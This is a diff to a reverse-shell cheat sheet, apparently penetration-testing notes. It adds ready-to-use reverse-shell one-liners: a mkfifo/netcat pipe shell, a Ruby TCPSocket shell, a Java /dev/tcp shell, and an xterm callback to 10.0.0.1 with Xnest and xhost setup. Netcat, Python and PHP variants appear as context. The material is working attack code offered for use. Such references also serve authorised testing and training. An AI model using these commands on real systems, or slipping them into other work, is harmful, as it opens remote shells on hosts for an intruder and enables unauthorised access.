@@ -9,6 +9,9 @@
   - [Perl](#perl)
   - [Python](#python)
   - [PHP](#php)
+  - [Ruby](#ruby)
+  - [Java](#java)
+  - [xterm](#xterm)
 
 ## Listner
 
@@ -41,6 +44,12 @@ nc -nv $IP $PORT -e /bin/bash
 nc.exe -nv $IP $PORT -e cmd
 ```
 
+Incase, you have different version of netcat:
+
+```bash
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f
+```
+
 ## Perl
 
 ---
@@ -63,4 +72,42 @@ python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOC
 
 ```bash
 php -r '$sock=fsockopen("$IP",$PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
+```
+
+## Ruby
+
+---
+
+```bash
+ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
+```
+
+## Java
+
+---
+
+```bash
+r = Runtime.getRuntime()
+p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.0.0.1/2002;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
+p.waitFor()
+```
+
+## xterm
+
+One of the simplest forms of reverse shell is an xterm session.  The following command should be run on the server.  It will try to connect back to you (10.0.0.1) on TCP port `6001`.
+
+```bash
+xterm -display 10.0.0.1:1
+```
+
+To catch the incoming xterm, start an X-Server (:1 – which listens on TCP port 6001).  One way to do this is with Xnest (to be run on your system):
+
+```bash
+Xnest :1
+```
+
+You’ll need to authorise the target to connect to you (command also run on your host):
+
+```bash
+xhost +targetip
 ```
